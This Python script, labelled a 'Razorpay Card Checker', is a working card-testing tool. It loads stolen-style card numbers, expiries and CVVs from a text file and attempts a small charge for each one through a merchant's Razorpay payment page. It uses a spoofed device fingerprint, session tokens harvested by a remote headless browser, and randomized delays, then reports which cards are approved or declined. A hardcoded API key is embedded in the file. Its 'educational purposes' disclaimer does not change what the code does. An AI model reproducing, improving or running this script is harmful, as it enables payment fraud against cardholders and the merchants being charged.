import requests
import json
import time
import random
from urllib.parse import urlencode, urlparse, parse_qs
from datetime import datetime
import re
import os
from playwright.sync_api import sync_playwright
from bs4 import BeautifulSoup


DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6..."
BROWSERLESS_API_KEY = "2SnMWeeEB7voHxK22f5ee7ff5e5d665176f02d0b9a566358d"




def get_dynamic_session_token():
    """Uses a cloud-based headless browser to get a valid session token."""
    if not BROWSERLESS_API_KEY or BROWSERLESS_API_KEY == "YOUR_API_KEY_HERE":
        return None, "Browserless.io API Key not set."

    browser_ws_endpoint = f'wss://production-sfo.browserless.io?token={BROWSERLESS_API_KEY}&timeout=60000'
    try:
        with sync_playwright() as p:
            browser = p.chromium.connect_over_cdp(browser_ws_endpoint, timeout=60000)
            page = browser.new_page()
            initial_url = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1"
            page.goto(initial_url, timeout=30000)
            page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
            final_url = page.url
            browser.close()

            session_token = parse_qs(urlparse(final_url).query).get("session_token", [None])[0]
            return (session_token, None) if session_token else (None, "Token not found in URL.")
    except Exception as e:
        return None, f"Playwright (session token) error: {e}"

def handle_redirect_and_get_result(redirect_url):
    """Navigates to the 3DS redirect URL to scrape the final payment status."""
    if not BROWSERLESS_API_KEY or BROWSERLESS_API_KEY == "YOUR_API_KEY_HERE":
        return "Browserless.io API Key not set."

    browser_ws_endpoint = f'wss://production-sfo.browserless.io?token={BROWSERLESS_API_KEY}&timeout=60000'
    try:
        with sync_playwright() as p:
            browser = p.chromium.connect_over_cdp(browser_ws_endpoint, timeout=60000)
            page = browser.new_page()
            page.goto(redirect_url, timeout=45000, wait_until='networkidle')



            body_locator = page.locator("body")
            body_locator.wait_for(timeout=10000)
            full_status_text = body_locator.inner_text()

            browser.close()

            return " ".join(full_status_text.split())
    except Exception as e:
        return f"Playwright (redirect) error: {e}"

def extract_merchant_data_with_playwright(site_url):
    """
    Loads the page in a real browser, finds the correct script tag, 
    and extracts the data, handling nested quotes and whitespace.
    """
    if not BROWSERLESS_API_KEY or BROWSERLESS_API_KEY == "YOUR_API_KEY_HERE":
        return None, None, None, None, "Browserless.io API Key not set."

    browser_ws_endpoint = f'wss://production-sfo.browserless.io?token={BROWSERLESS_API_KEY}&timeout=60000'
    try:
        with sync_playwright() as p:
            browser = p.chromium.connect_over_cdp(browser_ws_endpoint, timeout=60000)
            page = browser.new_page()
            page.goto(site_url, timeout=45000, wait_until='networkidle')
            page_html = page.content()
            browser.close()

        soup = BeautifulSoup(page_html, 'html.parser')
        scripts = soup.find_all('script')

        data_script_content = None
        for script in scripts:
            if script.string and 'var data = {' in script.string:
                data_script_content = script.string.strip().strip('"') 
                break

        if not data_script_content:
            return None, None, None, None, "Could not find the specific data script tag in the HTML."

        match = re.search(r'var data = ({.*?});', data_script_content, re.DOTALL)
        if not match:
            return None, None, None, None, "Found script tag, but failed to extract 'data' object with regex."

        data = json.loads(match.group(1))

        keyless_header = data.get("keyless_header")
        key_id = data.get("key_id")
        payment_link = data.get("payment_link", {})
        payment_link_id = payment_link.get("id")
        payment_page_items = payment_link.get("payment_page_items", []) 
        payment_page_item_id = payment_page_items[0].get("id") if payment_page_items else None

        if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
            return None, None, None, None, "One or more required fields are missing from the extracted data object."

        return keyless_header, key_id, payment_link_id, payment_page_item_id, None
    except Exception as e:
        return None, None, None, None, f"An error occurred during data extraction: {e}"


def random_user_info():
    return {"name": "Test User", "email": f"testuser{random.randint(100,999)}@example.com", "phone": f"9876543{random.randint(100,999)}"}

def fetch_bin_info(bin6):
    try:
        res = requests.get(f"https://lookup.binlist.net/{bin6}", timeout=5)
        if res.status_code == 200:
            data = res.json()
            return data.get("bank", {}).get("name", "Unknown"), data.get("scheme", "Unknown")
    except: return "Unknown", "Unknown"

def create_order(session, payment_link_id, amount_paise, payment_page_item_id):
    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
    headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    payload = {"notes": {"comment": ""}, "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]}
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=15)
        resp.raise_for_status()
        return resp.json().get("order", {}).get("id")
    except: return None

def submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url):
    card_number, exp_month, exp_year, cvv = card_info
    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
    params = {"key_id": key_id, "session_token": session_token, "keyless_header": keyless_header}
    headers = {"x-session-token": session_token, "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
    data = {
        "notes[comment]": "", "payment_link_id": payment_link_id, "key_id": key_id, "callback_url": site_url,
        "contact": f"+91{user_info['phone']}", "email": user_info["email"], "currency": "INR", "_[library]": "checkoutjs",
        "_[platform]": "browser", "_[referer]": site_url, "amount": amount_paise, "order_id": order_id,
        "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT, "method": "card", "card[number]": card_number,
        "card[cvv]": cvv, "card[name]": user_info["name"], "card[expiry_month]": exp_month,
        "card[expiry_year]": exp_year, "save": "0"
    }
    return session.post(url, headers=headers, params=params, data=urlencode(data), timeout=20)




if __name__ == "__main__":
    print("--- Razorpay Card Checker (v5 - Final) ---")
    print("Ã¢ÂÂ Ã¯Â¸Â.")
    print("    Use responsibly and only for educational purposes on your own pages.\n")

    site_url = input("Enter the Razorpay Payment Page URL: ").strip()
    amount_str = input("Enter amount to charge (in Rupees, e.g., 1): ").strip()

    try:
        amount_rupees = int(amount_str)
        if amount_rupees < 1: amount_rupees = 1
    except ValueError:
        amount_rupees = 1
    amount_paise = amount_rupees * 100
    print(f"Charge amount set to Ã¢ÂÂ¹{amount_rupees}.")

    cards_file = "cards.txt"
    if not os.path.exists(cards_file):
        print(f"\n[ERROR] File not found: '{cards_file}'. Please create it and add cards.")
        exit()

    with open(cards_file, "r") as f:
        cards = [line.strip() for line in f if line.strip()]
    if not cards:
        print(f"[ERROR] No cards found in {cards_file}.")
        exit()

    print(f"\n[INFO] Loaded {len(cards)} card(s) from {cards_file}.")

    print("[INFO] Launching browser to fetch and parse merchant page...")
    keyless_header, key_id, payment_link_id, payment_page_item_id, error_msg = extract_merchant_data_with_playwright(site_url)
    if error_msg:
        print(f"[FATAL] {error_msg}")
        exit()
    print("[SUCCESS] Merchant data extracted.")

    print("[INFO] Getting a new session token...")
    session_token, error_msg = get_dynamic_session_token()
    if error_msg:
        print(f"[FATAL] {error_msg}")
        exit()
    print("[SUCCESS] Session token acquired.")

    print("\n" + "="*40)
    print("--- Starting Card Checks ---")
    print("="*40 + "\n")

    for i, cc_line in enumerate(cards):
        start_time = time.time()
        print(f"[{i+1}/{len(cards)}] Checking: {cc_line}")

        try:
            card_number, exp_month, exp_year, cvv = cc_line.split('|')
        except ValueError:
            print("   ---> [RESULT] Invalid card format in cards.txt. Skipping.\n")
            continue

        session = requests.Session()
        order_id = create_order(session, payment_link_id, amount_paise, payment_page_item_id)
        if not order_id:
            print("   ---> [RESULT] FATAL: Failed to generate Razorpay order ID.\n")
            continue

        time.sleep(random.uniform(1, 2))

        status_message = ""
        try:
            response = submit_payment(session, order_id, (card_number, exp_month, exp_year, cvv), random_user_info(),
                                      amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url)
            data = response.json()
            if data.get("redirect"):
                status_message = f"Redirected to 3DS page. Final Status: {handle_redirect_and_get_result(data['request']['url'])}"
            elif "error" in data:

                status_message = f"DECLINED. Reason: {data['error'].get('description', 'No description')}. Full Response: {json.dumps(data)}"
            else:
                status_message = f"UNKNOWN RESPONSE. Full Response: {json.dumps(data)}"
        except Exception as e:
            status_message = f"SCRIPT ERROR during payment submission: {e}"

        duration = round(time.time() - start_time, 2)
        bank, brand = fetch_bin_info(card_number[:6])


        print(f"   ---> [RESULT] Status: {status_message}")
        print(f"        [INFO] Card: {card_number[:6]}******{card_number[-4:]} ({brand}) | Bank: {bank}")
        print(f"        [INFO] Time: {duration}s\n")

        if i < len(cards) - 1:
            time.sleep(3)

    print("--- All cards checked. ---")
